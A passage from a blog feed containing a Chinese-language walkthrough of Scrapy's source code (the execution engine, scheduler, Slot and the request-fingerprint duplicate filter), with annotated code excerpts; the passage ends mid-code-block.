&lt;p&gt;&lt;a href=&quot;http://myndtt.com/2018/02/01/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%B8%89/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;前面三&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这次接着上回要提到下载的地方&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;_next_request_from_scheduler&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(self, spider)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        slot = self.slot&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        request = slot.scheduler.next_request()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;not&lt;/span&gt; request:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;#去下载&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        d = self._download(request, spider)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;#处理下载返回结果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        d.addBoth(self._handle_downloader_output, request, spider)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        d.addErrback(&lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; f: logger.info(&lt;span class=&quot;string&quot;&gt;&#39;Error while handling downloader output&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                           exc_info=failure_to_exc_info(f),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                           extra=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;spider&#39;&lt;/span&gt;: spider&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        d.addBoth(&lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; _: slot.remove_request(request))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        d.addErrback(&lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; f: logger.info(&lt;span class=&quot;string&quot;&gt;&#39;Error while removing request from slot&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                           exc_info=failure_to_exc_info(f),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                           extra=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;spider&#39;&lt;/span&gt;: spider&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        d.addBoth(&lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; _: slot.nextcall.schedule())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        d.addErrback(&lt;span class=&quot;keyword&quot;&gt;lambda&lt;/span&gt; f: logger.info(&lt;span class=&quot;string&quot;&gt;&#39;Error while scheduling new request&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                           exc_info=failure_to_exc_info(f),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                           extra=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;spider&#39;&lt;/span&gt;: spider&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="python" scheme="https://myndtt.github.io/tags/python/"/>
    
      <category term="scrapy" scheme="https://myndtt.github.io/tags/scrapy/"/>
    
  </entry>
  
  <entry>
    <title>scrapy 浅分析(三)</title>
    <link href="https://myndtt.github.io/2018/02/01/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%B8%89/"/>
    <id>https://myndtt.github.io/2018/02/01/scrapy-浅分析-三/</id>
    <published>2018-02-01T02:05:18.000Z</published>
    <updated>2019-09-22T05:04:46.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h1><p><a href="http://myndtt.com/2018/01/30/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%B8%80/" target="_blank" rel="noopener">前面一</a></p><p><a href="http://myndtt.com/2018/01/31/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%BA%8C/" target="_blank" rel="noopener">前面二</a></p><p>这次看看引擎里面的东西。在此之前看看文档中的流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Scrapy中的数据流由执行引擎控制，其过程如下:</span><br><span class="line"></span><br><span class="line">1.引擎打开一个网站(open a domain)，找到处理该网站的Spider并向该spider请求第一个要爬取的URL(s)。</span><br><span class="line">2.引擎从Spider中获取到第一个要爬取的URL并在调度器(Scheduler)以Request调度。</span><br><span class="line">3引擎向调度器请求下一个要爬取的URL。</span><br><span class="line">4.调度器返回下一个要爬取的URL给引擎，引擎将URL通过下载中间件(请求(request)方向)转发给下载器(Downloader)。</span><br><span class="line">------------------------------------------------------------------（下面下一篇提到）</span><br><span class="line">5.一旦页面下载完毕，下载器生成一个该页面的Response，并将其通过下载中间件(返回(response)方向)发送给引擎。</span><br><span class="line">6.引擎从下载器中接收到Response并通过Spider中间件(输入方向)发送给Spider处理。</span><br><span class="line">7.Spider处理Response并返回爬取到的Item及(跟进的)新的Request给引擎。</span><br><span class="line">8.引擎将(Spider返回的)爬取到的Item给Item Pipeline，将(Spider返回的)Request给调度器。</span><br><span class="line">9.(从第二步)重复直到调度器中没有更多地request，引擎关闭该网站。</span><br></pre></td></tr></table></figure><h1 id="0x01-引擎"><a href="#0x01-引擎" class="headerlink" title="0x01.引擎"></a>0x01.引擎</h1><p><img src="https://myndtt.github.io/images/59.png" alt="59"></p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecutionEngine</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, crawler, spider_closed_callback)</span>:</span></span><br><span class="line">        self.crawler = crawler</span><br><span class="line">        self.settings = crawler.settings</span><br><span class="line">        <span class="comment">#信号</span></span><br><span class="line">        self.signals = crawler.signals</span><br><span class="line">        <span class="comment">#日志</span></span><br><span class="line">        self.logformatter = crawler.logformatter</span><br><span class="line">        self.slot = <span class="literal">None</span></span><br><span class="line">        self.spider = <span class="literal">None</span></span><br><span class="line">        self.running = <span class="literal">False</span></span><br><span class="line">        self.paused = <span class="literal">False</span></span><br><span class="line">        <span class="comment">#scheduler_cls没有实例化</span></span><br><span class="line">        self.scheduler_cls = load_object(self.settings[<span class="string">'SCHEDULER'</span>])</span><br><span class="line">        downloader_cls = load_object(self.settings[<span class="string">'DOWNLOADER'</span>])</span><br><span class="line">        <span class="comment">#实例化</span></span><br><span class="line">        self.downloader = downloader_cls(crawler)</span><br><span class="line">        <span class="comment">#引擎以此连接爬虫类</span></span><br><span class="line">        self.scraper = Scraper(crawler)</span><br><span class="line">        self._spider_closed_callback = spider_closed_callback</span><br></pre></td></tr></table></figure><p>初始化中。分别通过配置加载调度器对象和下载器对象。初始化后执行引擎的<code>open_spider</code>方法(上篇提到了)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@defer.inlineCallbacks</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span><span class="params">(self, spider, start_requests=<span class="params">()</span>, close_if_idle=True)</span>:</span></span><br><span class="line">       <span class="keyword">assert</span> self.has_capacity(), <span class="string">"No free spider slot when opening %r"</span> % \</span><br><span class="line">           spider.name</span><br><span class="line">       logger.info(<span class="string">"Spider opened"</span>, extra=&#123;<span class="string">'spider'</span>: spider&#125;)</span><br><span class="line">       <span class="comment">#将引擎的_next_request方法传进CallLaterOnce中</span></span><br><span class="line">       nextcall = CallLaterOnce(self._next_request, spider)</span><br><span class="line">       <span class="comment">#此时scheuler_cls开始实例化了</span></span><br><span class="line">       scheduler = self.scheduler_cls.from_crawler(self.crawler)</span><br><span class="line">       <span class="comment">#调用spidermw的process_start_requests方法</span></span><br><span class="line">       start_requests = <span class="keyword">yield</span> self.scraper.spidermw.process_start_requests(start_requests, spider)</span><br><span class="line">       slot = Slot(start_requests, close_if_idle, nextcall, scheduler)</span><br><span class="line">       self.slot = slot</span><br><span class="line">       self.spider = spider</span><br><span class="line"><span class="comment"># 调用scheduler的open，主要去重request</span></span><br><span class="line">       <span class="keyword">yield</span> scheduler.open(spider)</span><br><span class="line">       <span class="comment">#调用scraper.open_spider,主要初始化一下输出的事情</span></span><br><span class="line">       <span class="keyword">yield</span> self.scraper.open_spider(spider)</span><br><span class="line">       <span class="comment">#stats与STATS_CLASS = 'scrapy.statscollectors.MemoryStatsCollector'有关</span></span><br><span class="line">       <span class="comment">#一个简单的数据收集器。其在 spider 运行完毕后将其数据保存在内存中。数据可以通过 spider_stats #属性访问</span></span><br><span class="line">       self.crawler.stats.open_spider(spider)</span><br><span class="line">       <span class="comment">#信号日志</span></span><br><span class="line">       <span class="keyword">yield</span> self.signals.send_catch_log_deferred(signals.spider_opened, spider=spider)</span><br><span class="line">       <span class="comment">#开始(第一次)调度</span></span><br><span class="line">       slot.nextcall.schedule()</span><br><span class="line">       slot.heartbeat.start(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>先看看<code>from scrapy.utils.reactor import CallLaterOnce</code> 进入reactor.py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CallLaterOnce</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""Schedule a function to be called in the next reactor loop, but only if</span></span><br><span class="line"><span class="string">    it hasn't been already scheduled since the last time it ran.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, func, *a, **kw)</span>:</span></span><br><span class="line">        self._func = func</span><br><span class="line">        self._a = a</span><br><span class="line">        self._kw = kw</span><br><span class="line">        self._call = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">schedule</span><span class="params">(self, delay=<span class="number">0</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self._call <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self._call = reactor.callLater(delay, self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cancel</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self._call:</span><br><span class="line">            self._call.cancel()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._call = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> self._func(*self._a, **self._kw)</span><br></pre></td></tr></table></figure><p>按注释来看，这里利用reactor异步循环调用导入的<code>_next_request</code>方法，当运行起来时循环调用该函数。在进入<code>spidermw.py</code>文件里面看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_start_requests</span><span class="params">(self, start_requests, spider)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._process_chain(<span class="string">'process_start_requests'</span>, start_requests, spider)</span><br></pre></td></tr></table></figure><p>一直跟进所示的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_process_chain</span><span class="params">(self, methodname, obj, *args)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> process_chain(self.methods[methodname], obj, *args)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_chain</span><span class="params">(callbacks, input, *a, **kw)</span>:</span></span><br><span class="line">    <span class="string">"""Return a Deferred built by chaining the given callbacks"""</span></span><br><span class="line">    d = defer.Deferred()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> callbacks:</span><br><span class="line">        d.addCallback(x, *a, **kw)</span><br><span class="line">    d.callback(input)</span><br><span class="line">    <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure><p>这是用户项目里<code>middleres.py</code>对应的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_start_requests</span><span class="params">(start_requests, spider)</span>:</span></span><br><span class="line">        <span class="comment"># Called with the start requests of the spider, and works</span></span><br><span class="line">        <span class="comment"># similarly to the process_spider_output() method, except</span></span><br><span class="line">        <span class="comment"># that it doesn’t have a response associated.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Must return only requests (not items).</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> start_requests:</span><br><span class="line">            <span class="keyword">yield</span> r</span><br></pre></td></tr></table></figure><p>这里什么都没有,方法被重写，其实我们都可以在其中写一些东西来处理开始请求前的事情,并将request返回。</p><p>接下来是用Slot把request进行封装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slot</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, start_requests, close_if_idle, nextcall, scheduler)</span>:</span></span><br><span class="line">        self.closing = <span class="literal">False</span></span><br><span class="line">        self.inprogress = set() <span class="comment"># requests in progress</span></span><br><span class="line">        self.start_requests = iter(start_requests)</span><br><span class="line">        self.close_if_idle = close_if_idle</span><br><span class="line">        self.nextcall = nextcall</span><br><span class="line">        self.scheduler = scheduler</span><br><span class="line">        self.heartbeat = task.LoopingCall(nextcall.schedule)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        self.inprogress.add(request)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        self.inprogress.remove(request)</span><br><span class="line">        self._maybe_fire_closing()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.closing = defer.Deferred()</span><br><span class="line">        self._maybe_fire_closing()</span><br><span class="line">        <span class="keyword">return</span> self.closing</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_maybe_fire_closing</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.closing <span class="keyword">and</span> <span class="keyword">not</span> self.inprogress:</span><br><span class="line">            <span class="keyword">if</span> self.nextcall:</span><br><span class="line">                self.nextcall.cancel()</span><br><span class="line">                <span class="keyword">if</span> self.heartbeat.running:</span><br><span class="line">                    self.heartbeat.stop()</span><br><span class="line">            self.closing.callback(<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>接下来就是调度开始：<code>yield scheduler.open(spider)</code>进入core下<code>scheduler.py</code>文件下。由此进入框架的第二步。</p><p>在此之前看看其中的<code>from_crawler</code>函数和该类初始化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">   @classmethod</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">from_crawler</span><span class="params">(cls, crawler)</span>:</span></span><br><span class="line">       settings = crawler.settings</span><br><span class="line">       dupefilter_cls = load_object(settings[<span class="string">'DUPEFILTER_CLASS'</span>])</span><br><span class="line">       <span class="comment">#实例化</span></span><br><span class="line">       dupefilter = dupefilter_cls.from_settings(settings)</span><br><span class="line">       <span class="comment">#队列优先级</span></span><br><span class="line">       pqclass = load_object(settings[<span class="string">'SCHEDULER_PRIORITY_QUEUE'</span>])</span><br><span class="line">       <span class="comment">#磁盘队列</span></span><br><span class="line">       dqclass = load_object(settings[<span class="string">'SCHEDULER_DISK_QUEUE'</span>])</span><br><span class="line">       <span class="comment">#内存队列</span></span><br><span class="line">       mqclass = load_object(settings[<span class="string">'SCHEDULER_MEMORY_QUEUE'</span>])</span><br><span class="line">       logunser = settings.getbool(<span class="string">'LOG_UNSERIALIZABLE_REQUESTS'</span>, settings.getbool(<span class="string">'SCHEDULER_DEBUG'</span>))</span><br><span class="line">       <span class="keyword">return</span> cls(dupefilter, jobdir=job_dir(settings), logunser=logunser,</span><br><span class="line">                  stats=crawler.stats, pqclass=pqclass, dqclass=dqclass, mqclass=mqclass)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, dupefilter, jobdir=None, dqclass=None, mqclass=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                logunser=False, stats=None, pqclass=None)</span>:</span></span><br><span class="line">       self.df = dupefilter<span class="comment">#df来自于这个dupefilter，上面提到其在from_crawler已经实例化了</span></span><br><span class="line">       self.dqdir = self._dqdir(jobdir)</span><br><span class="line">       self.pqclass = pqclass</span><br><span class="line">       self.dqclass = dqclass</span><br><span class="line">       self.mqclass = mqclass</span><br><span class="line">       self.logunser = logunser</span><br><span class="line">       self.stats = stats</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">        self.spider = spider</span><br><span class="line">    <span class="comment">#建立优先级队列</span></span><br><span class="line">        self.mqs = self.pqclass(self._newmq)</span><br><span class="line">      <span class="comment">#非空则实例化磁盘优先级队列</span></span><br><span class="line">        self.dqs = self._dq() <span class="keyword">if</span> self.dqdir <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment">#df来自与配置中DUPEFILTER_CLASS = 'scrapy.dupefilters.RFPDupeFilter'</span></span><br><span class="line">        <span class="keyword">return</span> self.df.open()</span><br></pre></td></tr></table></figure><p>首先dqdir与<code>_dqdir</code>有关</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_dqdir</span><span class="params">(self, jobdir)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> jobdir:</span><br><span class="line">            dqdir = join(jobdir, <span class="string">'requests.queue'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> exists(dqdir):</span><br><span class="line">                os.makedirs(dqdir)</span><br><span class="line">            <span class="keyword">return</span> dqdir</span><br></pre></td></tr></table></figure><p>也即：</p><p>启动调度器时, 调度器会读取配置中的”JOBDIR”设置. 如果这个变量不存在, 则不使用磁盘队列, 而内存队列不需要这个设置, 因此, 内存队列始终存在, 而磁盘队列只有在设置了”JOBDIR”这个变量之后才会使用。</p><p>随后看看<code>dupefilters.py</code>文件下的对应那个类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RFPDupeFilter</span><span class="params">(BaseDupeFilter)</span>:</span></span><br><span class="line">    <span class="string">"""Request Fingerprint duplicates filter"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, path=None, debug=False)</span>:</span></span><br><span class="line">        self.file = <span class="literal">None</span></span><br><span class="line">        self.fingerprints = set()</span><br><span class="line">        self.logdupes = <span class="literal">True</span></span><br><span class="line">        self.debug = debug</span><br><span class="line">        self.logger = logging.getLogger(__name__)</span><br><span class="line">        <span class="keyword">if</span> path:</span><br><span class="line">            self.file = open(os.path.join(path, <span class="string">'requests.seen'</span>), <span class="string">'a+'</span>)</span><br><span class="line">            self.file.seek(<span class="number">0</span>)</span><br><span class="line">            self.fingerprints.update(x.rstrip() <span class="keyword">for</span> x <span class="keyword">in</span> self.file)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_settings</span><span class="params">(cls, settings)</span>:</span></span><br><span class="line">        debug = settings.getbool(<span class="string">'DUPEFILTER_DEBUG'</span>)</span><br><span class="line">        <span class="keyword">return</span> cls(job_dir(settings), debug)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request_seen</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        fp = self.request_fingerprint(request)</span><br><span class="line">        <span class="keyword">if</span> fp <span class="keyword">in</span> self.fingerprints:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        self.fingerprints.add(fp)</span><br><span class="line">        <span class="keyword">if</span> self.file:</span><br><span class="line">            self.file.write(fp + os.linesep)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request_fingerprint</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> request_fingerprint(request)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self, reason)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.file:</span><br><span class="line">            self.file.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.debug:</span><br><span class="line">            msg = <span class="string">"Filtered duplicate request: %(request)s"</span></span><br><span class="line">            self.logger.debug(msg, &#123;<span class="string">'request'</span>: request&#125;, extra=&#123;<span class="string">'spider'</span>: spider&#125;)</span><br><span class="line">        <span class="keyword">elif</span> self.logdupes:</span><br><span class="line">            msg = (<span class="string">"Filtered duplicate request: %(request)s"</span></span><br><span class="line">                   <span class="string">" - no more duplicates will be shown"</span></span><br><span class="line">                   <span class="string">" (see DUPEFILTER_DEBUG to show all duplicates)"</span>)</span><br><span class="line">            self.logger.debug(msg, &#123;<span class="string">'request'</span>: request&#125;, extra=&#123;<span class="string">'spider'</span>: spider&#125;)</span><br><span class="line">            